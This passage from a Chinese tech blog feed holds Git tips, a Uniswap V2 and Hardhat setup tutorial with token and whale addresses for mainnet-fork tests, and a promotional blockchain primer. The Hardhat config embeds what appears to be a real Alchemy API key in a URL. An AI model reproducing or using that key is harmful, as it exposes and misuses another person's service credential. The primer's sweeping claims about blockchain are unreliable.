origin master<br></code></pre></td></tr></table></figure><h2 id="Git进阶"><a href="#Git进阶" class="headerlink" title="Git进阶"></a>Git进阶</h2><h3 id="1-上传后打不开文件夹（出现白箭头）"><a href="#1-上传后打不开文件夹（出现白箭头）" class="headerlink" title="1. 上传后打不开文件夹（出现白箭头）"></a>1. 上传后打不开文件夹（出现白箭头）</h3><blockquote><p>这是因为其他工程下有.git文件，Github视其为子系统模块。</p><p>删除文件夹下的.git文件即可</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git rm --cached &lt;File Name&gt;<br>git add . <br>git commit -m &quot;delete .git&quot;<br>git push<br></code></pre></td></tr></table></figure><h2 id="2-克隆dev分支并合并到main分支"><a href="#2-克隆dev分支并合并到main分支" class="headerlink" title="2. 克隆dev分支并合并到main分支"></a>2. 克隆dev分支并合并到main分支</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">拉取指定分支</span><br>git clone -b dev [git仓库地址]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">为了保险起见，可以将远程master分支pull下来</span><br>git pull<br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换到main分支</span><br>git checkout main<br><span class="hljs-meta prompt_"># </span><span class="language-bash">将分支代码合并到main上</span><br>git merge dev<br>git merge master --allow-unrelated-histories<br><span class="hljs-meta prompt_"># </span><span class="language-bash">在本地合并分支，我们还要将主分支推到远程仓库</span><br>git push origin<br><br> <br></code></pre></td></tr></table></figure><p><strong>附：</strong></p><p><img src="/2022/09/01/Git%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>基操勿6</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git-Bash基操</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Part1. Uniswap V2 Start</title>
    <link href="/2022/09/01/Part1.%20Uniswap%20V2%20Start/"/>
    <url>/2022/09/01/Part1.%20Uniswap%20V2%20Start/</url>
    
    <content type="html"><![CDATA[<h1 id="part1-Uniswap-V2-Start"><a href="#part1-Uniswap-V2-Start" class="headerlink" title="part1. Uniswap V2  Start"></a>part1. Uniswap V2  Start</h1><blockquote><p>DEFI 进阶课程 </p><p>这节课将带大家了解Uniswap v2开发的基础模块，以及快速搭建项目</p></blockquote><h2 id="前言（入门）"><a href="#前言（入门）" class="headerlink" title="前言（入门）"></a>前言（入门）</h2><p>在 DeFi (去中心化金融)赛道中，DEX(去中心化交易所) 无疑是最核心的一块，而 <strong>Uniswap</strong> 又是整个 DEX 领域中的龙头，如 <strong>SushiSwap、PancakeSwap</strong> 等都是沿袭了 Uniswap 的。因此我们用Uniswap V2来开启DeFi进阶的课程。</p><h1 id="Uniswap-v2-实现-Defi的基础模块"><a href="#Uniswap-v2-实现-Defi的基础模块" class="headerlink" title="Uniswap v2 实现 Defi的基础模块"></a>Uniswap v2 实现 Defi的基础模块</h1><h2 id="1-v2-Core-核心"><a href="#1-v2-Core-核心" class="headerlink" title="1.v2-Core(核心)"></a>1.v2-Core(核心)</h2><blockquote><p>源码文档<a href="https://github.com/Uniswap/uniswap-v2-core">  Source code</a></p></blockquote><p>核心由一个单例工厂和许多交易对组成，工厂负责创建和索引。这些工厂合约非常少，甚至是极其稀有的。这样做的简单理由是，具有较小表面积的合约更容易推理，更不容易出错，并且在功能上更优雅。也许这种设计的最大优点是系统的许多所需属性可以直接在代码中声明，几乎没有出错的余地。然而，一个缺点是核心合约在某种程度上对用户不友好。事实上，对于大多数用例，不建议直接与这些合约交互。相反，应该使用外部合约进行交互。</p><h3 id="1-1-Factory-工厂"><a href="#1-1-Factory-工厂" class="headerlink" title="1.1 Factory(工厂)"></a>1.1 Factory(工厂)</h3><p><code>0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</code></p><blockquote><p>参考文档  <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/factory">Reference documentation</a></p></blockquote><p>工厂持有负责为币对供电的通用字节码。它的主要工作是为每个独特的代币对创建一个且只有一个智能合约。它还包含开启协议收费的逻辑。</p><h3 id="1-2-Pairs-交易对"><a href="#1-2-Pairs-交易对" class="headerlink" title="1.2 Pairs(交易对)"></a>1.2 Pairs(交易对)</h3><blockquote><p>参考文档  <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair">Reference documentation</a></p></blockquote><p>货币对有两个主要目的：充当自动做市商和跟踪池代币余额。他们还公开了可用于构建去中心化价格预言机的数据。</p><h2 id="2-v2-Periphery-外部活动"><a href="#2-v2-Periphery-外部活动" class="headerlink" title="2. v2-Periphery(外部活动)"></a>2. v2-Periphery(外部活动)</h2><blockquote><p>源码  <a href="https://github.com/Uniswap/uniswap-v2-periphery">Source code</a></p></blockquote><p>外围是<strong>一组</strong>智能合约，包括了Library(库)和Router(路由)，它旨在支持与Core(核心)的特定领域交互。由于 Uniswap 的无许可性质，下面描述的合约没有特权，实际上只是可能的外围类合约宇宙的一小部分。但是，它们是如何安全有效地与 Uniswap V2 交互的有用示例。</p><h3 id="2-1-Library-库"><a href="#2-1-Library-库" class="headerlink" title="2.1 Library(库)"></a>2.1 Library(库)</h3><blockquote><p>参考文档  <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/library">Reference documentation</a></p></blockquote><p>库为获取数据和定价提供了各种便利功能。</p><h3 id="2-2-Router-路由"><a href="#2-2-Router-路由" class="headerlink" title="2.2 Router(路由)"></a>2.2 Router(路由)</h3><p><code>0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</code></p><blockquote><p>参考文档  <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02">Reference documentation</a></p></blockquote><p>使用该库的路由器完全支持前端提供交易和流动性管理功能的所有基本要求。值得注意的是，它原生支持多对交易（例如 x 到 y 到 z），将 ETH 视为一等公民，并提供元交易以消除流动性。</p><h1 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h1><h2 id="环境版本（本教案）"><a href="#环境版本（本教案）" class="headerlink" title="环境版本（本教案）"></a>环境版本（本教案）</h2><ul><li>hardhat  2.10.1</li><li>solidity 0.8.0</li><li>compiler 0.8.0</li></ul><h2 id="创建新文件夹，安全帽初始化"><a href="#创建新文件夹，安全帽初始化" class="headerlink" title="创建新文件夹，安全帽初始化"></a>创建新文件夹，安全帽初始化</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir uniswapDemo<br><br>cd uniswapDemo<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安全帽初始化项目</span><br>npx hardhat<br><span class="hljs-meta prompt_">#</span><span class="language-bash">选择 Create an empty JavaScipt Project</span><br>npm init -y<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建接口文件夹，以及依赖文件夹</span><br>mkdir contracts/interfaces<br></code></pre></td></tr></table></figure><h2 id="安装必要模块"><a href="#安装必要模块" class="headerlink" title="安装必要模块"></a>安装必要模块</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">项目安装安全帽</span><br>npm install --D hardhat@2.10.1<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安全帽必要模块安装</span><br>npm install --D @nomiclabs/hardhat-waffle chai @nomiclabs/hardhat-ethers ethers <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装openzeppelin</span><br>npm install @openzeppelin/contracts<br><span class="hljs-meta prompt_">#</span><span class="language-bash">uniswap v2模块（暂时不用安装）</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">npm i --save @uniswap/v2-core @uniswap/v2-periphery</span><br></code></pre></td></tr></table></figure><p>安装成功后，再进行下列操作，如果安装不成功，请联系助教</p><h2 id="修改hardhat-config-js"><a href="#修改hardhat-config-js" class="headerlink" title="修改hardhat.config.js"></a>修改<code>hardhat.config.js</code></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@nomiclabs/hardhat-waffle&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAINNET_URL</span> = <span class="hljs-string">&quot;https://eth-mainnet.g.alchemy.com/v2/WyuB7QMMto4srxT4WPnDkX-vOVYCRv3i&quot;</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">solidity</span>: <span class="hljs-string">&quot;0.8.0&quot;</span>,<br>  <span class="hljs-attr">networks</span>: &#123;<br>    <span class="hljs-attr">hardhat</span>: &#123;<br>      <span class="hljs-attr">forking</span>: &#123;<br>        <span class="hljs-attr">url</span>: <span class="hljs-variable constant_">MAINNET_URL</span><br>      &#125;,<br>      <br>    &#125;<br>  &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h2 id="测试项目编译是否正常"><a href="#测试项目编译是否正常" class="headerlink" title="测试项目编译是否正常"></a>测试项目编译是否正常</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx hardhat compile<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">nothing to compile</span><br></code></pre></td></tr></table></figure><h2 id="⭐必要文件-一定要保存"><a href="#⭐必要文件-一定要保存" class="headerlink" title="⭐必要文件(一定要保存)"></a>⭐必要文件(一定要保存)</h2><blockquote><p>这两份文件在之后的每一次样例中都会使用！</p></blockquote><h3 id="config-js"><a href="#config-js" class="headerlink" title="config.js"></a><code>config.js</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DAI</span> = <span class="hljs-string">&quot;0x6B175474E89094C44Da98b954EedeAC495271d0F&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USDC</span> = <span class="hljs-string">&quot;0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USDT</span> = <span class="hljs-string">&quot;0xdAC17F958D2ee523a2206206994597C13D831ec7&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WETH</span> = <span class="hljs-string">&quot;0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WBTC</span> = <span class="hljs-string">&quot;0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599&quot;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WETH_10</span> = <span class="hljs-string">&quot;0xf4BB2e28688e89fCcE3c0580D37d36A7672E8A9F&quot;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WETH_WHALE</span>= <span class="hljs-string">&quot;0xee2826453A4Fd5AfeB7ceffeEF3fFA2320081268&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DAI_WHALE</span>=<span class="hljs-string">&quot;0xF977814e90dA44bFA03b6295A0616a897441aceC&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USDC_WHALE</span>=<span class="hljs-string">&quot;0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USDT_WHALE</span>=<span class="hljs-string">&quot;0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WBTC_WHALE</span>=<span class="hljs-string">&quot;0xF977814e90dA44bFA03b6295A0616a897441aceC&quot;</span><br><br><br><span class="hljs-comment">// compound</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CDAI</span> = <span class="hljs-string">&quot;0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CUSDC</span> = <span class="hljs-string">&quot;0x39AA39c021dfbaE8faC545936693aC917d5E7563&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CWBTC</span> = <span class="hljs-string">&quot;0xccF4429DB6322D5C611ee964527D42E5d685DD6a&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CETH</span> = <span class="hljs-string">&quot;0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5&quot;</span><br><br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-variable constant_">DAI</span>,<br>  <span class="hljs-variable constant_">USDC</span>,<br>  <span class="hljs-variable constant_">USDT</span>,<br>  <span class="hljs-variable constant_">WETH</span>,<br>  <span class="hljs-variable constant_">WBTC</span>,<br>  <span class="hljs-variable constant_">WETH_10</span>,<br>  <span class="hljs-variable constant_">DAI_WHALE</span>,<br>  <span class="hljs-variable constant_">USDC_WHALE</span>,<br>  <span class="hljs-variable constant_">USDT_WHALE</span>,<br>  <span class="hljs-variable constant_">WETH_WHALE</span>,<br>  <span class="hljs-variable constant_">WBTC_WHALE</span>,<br>  <span class="hljs-variable constant_">CDAI</span>,<br>  <span class="hljs-variable constant_">CUSDC</span>,<br>  <span class="hljs-variable constant_">CWBTC</span>,<br>  <span class="hljs-variable constant_">CETH</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="util-js"><a href="#util-js" class="headerlink" title="util.js"></a><code>util.js</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BN</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;bn.js&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ZERO_ADDRESS</span> = <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000&quot;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">cast</span>(<span class="hljs-params">x</span>) &#123;<br>  <span class="hljs-keyword">if</span> (x <span class="hljs-keyword">instanceof</span> <span class="hljs-variable constant_">BN</span>) &#123;<br>    <span class="hljs-keyword">return</span> x;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">BN</span>(x);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">eq</span>(<span class="hljs-params">x, y</span>) &#123;<br>  x = <span class="hljs-title function_">cast</span>(x);<br>  y = <span class="hljs-title function_">cast</span>(y);<br>  <span class="hljs-keyword">return</span> x.<span class="hljs-title function_">eq</span>(y);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">pow</span>(<span class="hljs-params">x, y</span>) &#123;<br>  x = <span class="hljs-title function_">cast</span>(x);<br>  y = <span class="hljs-title function_">cast</span>(y);<br>  <span class="hljs-keyword">return</span> x.<span class="hljs-title function_">pow</span>(y);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">frac</span>(<span class="hljs-params">x, n, d</span>) &#123;<br>  x = <span class="hljs-title function_">cast</span>(x);<br>  n = <span class="hljs-title function_">cast</span>(n);<br>  d = <span class="hljs-title function_">cast</span>(d);<br>  <span class="hljs-keyword">return</span> x.<span class="hljs-title function_">mul</span>(n).<span class="hljs-title function_">div</span>(d);<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-variable constant_">ZERO_ADDRESS</span>,<br>  eq,<br>  pow,<br>  frac,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="这两个文件都要放在test文件夹里面"><a href="#这两个文件都要放在test文件夹里面" class="headerlink" title="这两个文件都要放在test文件夹里面"></a>这两个文件都要放在<code>test</code>文件夹里面</h3>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>DeFi</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Uniswap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从入门到搞懂区块链</title>
    <link href="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    <url>/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="🚀从入门开始到搞懂区块链"><a href="#🚀从入门开始到搞懂区块链" class="headerlink" title="🚀从入门开始到搞懂区块链"></a>🚀从入门开始到搞懂<em><strong>区块链</strong></em></h1><blockquote><p> Blog  By  Science_Jun</p></blockquote><h2 id="1-新时代的展望——区块链的价值"><a href="#1-新时代的展望——区块链的价值" class="headerlink" title="1. 新时代的展望——区块链的价值"></a>1. 新时代的展望——区块链的价值</h2><p><strong>A.</strong> 🚀在传统的互联网即信息互联网中，只能够实现信息之间的传播，例如张三把<strong>他今天没吃饭</strong>这件事告诉了李四，但这仅仅是将消息广播出去了而已，却不能够实现<u>价值的传递</u>。大胆设想，一根头发本身没有价值，但通过区块链，张三<strong>用一个比特币</strong>买下了这根头发，那么这根头发现在就被赋予了一个比特币的价值，这就是价值之间的传递。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/1.png" alt="1"></p><p>​         而在区块链中，恰恰能够<strong>点对点</strong>的解决价值传递的问题。这就是区块链的<strong>第一个价值</strong>所在。</p><hr><p><strong>B.</strong> 🚀<strong>阐述这一价值前，我想问大家一个问题：</strong>当你使用支付宝付款，你的信任基础是什么？是**<u>阿里巴巴</u><strong>这个</strong>企业<strong>，这个</strong>品牌**，还是他背后运行的代码？</p><blockquote><p>我想你内心的答案显而易见 [🐕doge]</p><p>是的，99.99999%的人信任的是品牌，企业，组织而非代码</p></blockquote><p>【信任人或组织的代价是什么？】</p><blockquote><p>人心叵测，想要打造出一个让人信任的企业或者品牌，往往需要与时间和巨额投资赛跑~ ~ 具市场调研，通常至少需要半个爽！！！可以说，成本极其昂贵。Σ(っ °Д °;)っ</p></blockquote><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/2.png" alt="2"></p><p>​         <strong>而</strong>在区块链的世界中，代码就代表着<strong>法律</strong>，它能够做到代码活动的<strong>公开透明性</strong>，从而使执行者在基于代码信任的基础上，实现经济活动。乍一听，这还蛮高深的，其实说白了，区块链就是个<strong>“透视镜”</strong>，在这里，没有暗箱操作，也没有小黑屋，大家都能够监视经济活动的执行。</p><hr><p><strong>C.<strong>🚀关于区块链的</strong>其他价值</strong>，在这里我不过多赘述，后面的教程会详细展开，朋友们直接上图！</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/3.png" alt="3"></p><hr><h2 id="2-不仅仅是数字货币——区块链的应用"><a href="#2-不仅仅是数字货币——区块链的应用" class="headerlink" title="2. 不仅仅是数字货币——区块链的应用"></a>2. 不仅仅是数字货币——区块链的应用</h2><h3 id="💎-区块链应用-行业"><a href="#💎-区块链应用-行业" class="headerlink" title="💎 区块链应用-行业"></a>💎 区块链应用-行业</h3><ol><li><p>🚀<strong>银行业：</strong>银行是一个安全的存储仓库和价值的交换中心，而区块链作为一种数字化的、安全的以及<strong>防篡改的</strong>总账账簿可以达到相同的功效。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/14.png" alt="14"></p><hr></li><li><p>🚀<strong>医疗业：</strong> 一直以来，医疗机构都要忍受无法在各平台上**<u>安全地共享数据</u><strong>。数据提供商之间更好的数据合作意味着更精确的诊断，更有效的治疗，以及提升医疗系统提供经济划算的医疗服务的整体能力。区块链技术可以让医院、患者和医疗利益链上的各方在区块链网络里</strong>共享数据<strong>，而不必</strong>担忧**数据的安全性和完整性。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/4.webp" alt="4"></p><hr></li><li><p>🚀<strong>物联网行业：</strong>使用区块链技术形成一个物联网设备去中心化网络的主体。根据部分网站，作为<strong>匿名的去中心化的</strong>点对点遥感技术，区块链可以成为大量设备的一种<strong>公共账簿</strong>，它们将不再需要有一个中央化的 路由在他们之间居中交通。在没有了中央控制系统来验证之后，设备将能够在它们之间互相匿名传输，并管理软件的更新、错误，或者进行能源管理。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/5.webp" alt="5"></p></li></ol><p>​              <u><strong>不理解没关系，举个例子：区块链+物流链</strong></u></p><ul><li><p>以一直受假冒伪劣产品困扰的茅台酒的防伪技术为例，2000年起，其酒盖里有一个唯一的<em>RFID标签</em>，可通过手机等设备以<em><strong>NFC</strong></em>方式读出，然后通过茅台的APP进行校验，以此防止伪造产品。 <strong>乍一看</strong>，这种防伪效果非常可靠。但2016年还是引爆了茅台酒防伪造假，虽然通过NFC方式验证OK，但经茅台专业人士鉴定为假酒。后来，在<strong>国酒茅台防伪溯源系统</strong>数据库审计中发现<em><strong>80万条假</strong></em>的防伪标签记录💔，原来防伪技术公司人员参与伪造。随后，茅台改用<strong>安全芯片防伪标签</strong>。<strong>然而</strong>，这里暴露出来的痛点并没有解决，即防伪信息掌握在某个中心机构中，有权限的人可以<strong>任意</strong>修改。因此2017年05月贵阳数博会上，马子哥就建议<strong>茅台防伪使用区块链</strong>，<strong>那么区块链和物流链的结合有什么优势呢？</strong></p><hr></li><li><p>🚀以上问题在本节<strong>最后</strong>公布答案，可以自己先思考一下哦😊！！</p></li></ul><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/5.jpg" alt="5"></p><p>​       </p><ol start="4"><li><p>🚀<strong>房地产行业：</strong>买卖产权的过程中的<strong>痛点</strong>在于：交易过程中和交易后缺乏透明，大量的文书工作，潜在的欺诈行为，公共记录中的错误等等，而这些还仅仅只是一部分。区块链提供了一个途径去实现无纸化和快速交易的需求。房地产区块链应用可以帮助记录、追溯和转移地契、房契、留置权等等，还给金融公司、产权公司和抵押公司提供了一个平台。区块链技术致力于<strong>安全保存文件</strong>，同时增强<strong>透明性</strong>，<strong>降低成本</strong>。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/6.jpeg" alt="6"></p><hr></li><li><p>🚀<strong>汽车业：</strong>早在2017年，就有<strong>大佬</strong>宣布合伙使用区块链建立一个概念证明来简化汽车租赁过程，并把它建成一个<strong>“点击，签约，和驾驶”</strong>的过程。未来的客户选择他们想要租赁的汽车，<strong>进入区块链的公共总账</strong>；然后，坐在驾驶座上，客户签订租赁协议和保险政策，而区块链则是同步更新信息。 这不是一个想象，对于汽车销售和汽车登记来说，这种类型的过程也可能会发展为现实。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/7.webp" alt="7"></p><hr></li><li><p>🚀保险业，云存储，股市交易，学术界，能源管理….<strong>只有你想不到的，</strong></p><p><strong>没有区块链技术不能涉及到</strong>的行业👍👍👍<img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/7.jpg" alt="7" style="zoom:20%;"></p></li></ol><h3 id="💎-区块链应用-具体经典实例"><a href="#💎-区块链应用-具体经典实例" class="headerlink" title="💎 区块链应用-具体经典实例"></a>💎 区块链应用-具体经典实例</h3><ol><li><p><strong>电子身份证（版权保护）：</strong>将“申请人+发布时间+发布内容”等<strong>版权</strong>信息加密后上传，版权信息用于<strong>唯一区块链ID</strong>，相当拥有了一张电子身份证。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/8.webp" alt="8"></p><ol start="2"><li><p><strong>腾讯公益寻人链（信息共享）：</strong>区块链本身就是需要保持各个节点的数据一致性的，可以说是<strong>自带信息共享</strong>功能；其次，实时的问题通过区块链的<strong>P2P</strong>技术可以实现；最后，利用区块链的<strong>不可篡改和共识机制</strong>，可构建其一条<strong>安全可靠</strong>的信息共享通道。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/9.webp" alt="9"></p></li></ol></li><li><p><strong>茅台酒防伪溯源（区块链+物流链）：</strong>上文说到在2017年05月贵阳数博会上，马子哥建议<strong>茅台防伪使用区块链</strong>。<strong>咱们书接上文[doge🐕]:</strong></p><ol><li><p>🚀<strong>去中心化：</strong>区块链没有中心化节点，各节点是平等的，掌握单个节点无法实现修改数据；需要掌控足够多的节点，才可能伪造数据，<em><strong>大大提高伪造数据的成本</strong></em>。</p></li><li><p>🚀<strong>透明可追踪：</strong>区块链天生的开放、透明，使得任何人都可以<em><strong>公开查询</strong></em>，伪造数据被发现的概率大增。</p></li><li><p>🚀<strong>不可篡改和伪造：</strong>区块链的数据不可篡改性，也保证了已销售出去的产品信息已永久记录，无法通过简单复制防伪信息蒙混过关，实现二次销售。</p></li><li><p>🚀<strong>数据安全及信用的自我建立：</strong>物流链的所有节点上区块链后，商品从生产商到消费者手里都有迹可循，形成完整链条；商品缺失的环节越多，将暴露出其是伪劣产品概率更大。</p></li></ol><blockquote> <img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/2.jpg" alt="2" style="zoom: 25%;"><p> Soga！马子哥诚不欺我！！果然是聪明人！(<em>^_^</em>)</p><p> 有了区块链，再也不用当冤大头喝假酒了！</p></blockquote><hr></li><li><p><strong>数字人民币DECP（P2P价值传递）：</strong>全称<em><strong>Digital Currency Electronic 